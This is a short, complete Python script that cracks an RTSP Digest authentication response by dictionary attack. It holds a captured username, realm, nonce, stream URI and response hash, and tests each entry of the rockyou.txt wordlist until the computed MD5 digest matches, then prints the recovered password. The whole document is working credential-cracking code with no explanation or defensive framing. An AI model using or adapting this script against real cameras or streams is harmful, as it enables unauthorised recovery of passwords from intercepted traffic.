#https://en.wikipedia.org/wiki/Digest_access_authentication
import hashlib

username = "viewer"
realm = "RTSP"
method = "DESCRIBE"
digesturi = "rtsp://10.66.130.2:554/stream0"
nonce = "0000040dY892418598785d2a2304a74adf22f6098f2792"
response="a12433e55ec296ef0ef530f6d64cc727"
#Authorization: Digest username="viewer", realm="RTSP", nonce="0000040dY892418598785d2a2304a74adf22f6098f2792", uri="rtsp://192.168.0.135:554/stream0", response="b5069773cabda9385476ccce17cd94fa"\r\n
#Authorization: Digest username="viewer", realm="RTSP", nonce="0000040dY892418598785d2a2304a74adf22f6098f2792", uri="rtsp://10.66.130.2:554/stream0", response="a12433e55ec296ef0ef530f6d64cc727"\r\n
with open("/home/gyrow/Downloads/rockyou.txt", "rb") as f:
    passwords = f.readlines()


HA2 = hashlib.md5(bytes(method+":"+digesturi,"utf-8")).hexdigest()
for password in passwords:
    password = password.decode('ISO-8859-1').strip("\n")
    HA1 = hashlib.md5(bytes(username+":"+realm+":"+password,"utf-8")).hexdigest()
    c_response = hashlib.md5(bytes(HA1+":"+nonce+":"+HA2, "utf-8")).hexdigest()
    if c_response == response:
        print(password)
        break
